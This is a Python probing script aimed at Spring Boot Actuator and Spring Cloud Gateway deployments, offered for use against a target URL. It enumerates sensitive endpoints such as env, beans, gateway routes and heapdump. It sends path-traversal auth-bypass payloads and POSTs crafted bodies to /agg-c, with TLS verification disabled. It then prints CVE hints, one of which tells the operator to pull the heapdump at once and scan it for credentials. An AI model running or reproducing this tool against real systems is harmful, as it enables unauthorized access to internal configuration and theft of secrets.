#!/usr/bin/env python3
"""Spring Gateway / Actuator quick probe (authorized targets only)."""
from __future__ import annotations

import argparse
import json
import ssl
import urllib.error
import urllib.request
from pathlib import Path

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = {"User-Agent": "sgc-probe/1.0", "Accept": "*/*"}

ACTUATOR_GET = [
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/env/HOSTNAME",
    "/actuator/gateway/routes",
    "/actuator/gateway/routedefinitions",
    "/actuator/configprops",
    "/actuator/nacosdiscovery",
    "/actuator/nacosconfig",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/metrics",
    "/actuator/conditions",
    "/actuator/heapdump",
    # CVE-2026-22733 — CloudFoundry Actuator path auth bypass (narrow)
    "/cloudfoundryapplication",
    "/cloudfoundryapplication/",
    "/cloudfoundryapplication/admin",
    "/v3/api-docs",
    "/open/v2/api-docs",
]

BYPASS_GET = [
    "/auth/..%2Factuator/health",
    "/auth/%2e%2e/actuator/health",
    "/system/gateway/route_range_conf/refreshInRule/../../../../actuator/health",
    "/system/gateway/route_range_conf/refreshOutRule/../../../../actuator/health",
    "/server/..%2Factuator/health",
    "/test/..%2Factuator/health",
]


def fetch(base: str, path: str, method: str = "GET", body: bytes | None = None, headers: dict | None = None):
    url = base.rstrip("/") + path
    h = dict(UA)
    if headers:
        h.update(headers)
    if body is not None:
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20, context=CTX) as r:
            data = r.read(8000)
            return {
                "url": url,
                "status": r.status,
                "len": len(data),
                "ct": r.headers.get("Content-Type", ""),
                "content_range": r.headers.get("Content-Range", ""),
                "body_preview": data[:500].decode("utf-8", "replace"),
            }
    except urllib.error.HTTPError as e:
        try:
            data = e.read(2000)
        except Exception:
            data = b""
        return {
            "url": url,
            "status": e.code,
            "len": len(data),
            "ct": e.headers.get("Content-Type", "") if e.headers else "",
            "body_preview": data[:400].decode("utf-8", "replace"),
        }
    except Exception as e:
        return {"url": url, "status": None, "error": str(e)[:200]}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="https://target")
    ap.add_argument("--out", required=True, help="output directory")
    ap.add_argument("--agg-c", action="store_true", help="also probe POST /agg-c")
    args = ap.parse_args()
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    results = []
    for p in ACTUATOR_GET + BYPASS_GET:
        extra = {"Range": "bytes=0-1023"} if p.rstrip("/").endswith("heapdump") else None
        row = fetch(args.base, p, headers=extra)
        results.append(row)
        print(f"{row.get('status')}\t{p}\t{row.get('len', 0)}\t{(row.get('body_preview') or row.get('error') or '')[:80]}")
    if args.agg_c:
        # common body shapes from report: list of internal paths
        for payload in (
            json.dumps(["actuator/health"]).encode(),
            json.dumps({"urls": ["xactuator/health"]}).encode(),
            b"xactuator/health",
        ):
            row = fetch(args.base, "/agg-c", method="POST", body=payload)
            results.append(row)
            print(f"{row.get('status')}\tPOST /agg-c\t{row.get('len', 0)}\t{(row.get('body_preview') or '')[:80]}")
    (out / "sgc_probe.json").write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")
    hits = [r for r in results if r.get("status") in (200, 201, 204, 206) and r.get("len", 0) > 2]
    print(f"\n[=] wrote {out/'sgc_probe.json'} hits={len(hits)}/{len(results)}")

    # Lightweight CVE hints (see 传承/Spring-CVE-41243-40976-22733手法.md)
    def _ok(path: str) -> bool:
        for r in results:
            if r.get("url", "").endswith(path) or r.get("url", "").rstrip("/").endswith(path.rstrip("/")):
                st = r.get("status")
                if path.rstrip("/").endswith("heapdump"):
                    # Range 0-1023 → 206 + 1KB；旧 0-0 只有 1 字节，len>2 会漏
                    return st in (200, 206) or bool(r.get("content_range"))
                return st in (200, 201, 204, 206) and (r.get("len") or 0) > 2
        return False

    hints = []
    if _ok("/actuator/gateway/routes") or _ok("/actuator/gateway/routedefinitions"):
        hints.append("CVE-2025-41243/22947-family: gateway actuator exposed → SpEL/属性篡改全链")
    if _ok("/actuator/env") and _ok("/actuator/beans") and not _ok("/actuator/health"):
        hints.append("CVE-2026-40976-candidate: env/beans open without health (check Boot 4.0.0-4.0.5)")
    if _ok("/cloudfoundryapplication") or _ok("/cloudfoundryapplication/admin"):
        hints.append("CVE-2026-22733-candidate: /cloudfoundryapplication reachable → compare auth vs /admin")
    if _ok("/actuator/heapdump"):
        hints.append(
            "heapdump 可达 → 立刻 "
            "heapdump_range_fetch.py（默认下完 heap_cred_scan 蓝鸟蜘蛛），禁止只 strings/只扫 health"
        )
    if hints:
        print("[!] CVE hints:")
        for h in hints:
            print(f"    - {h}")


if __name__ == "__main__":
    main()
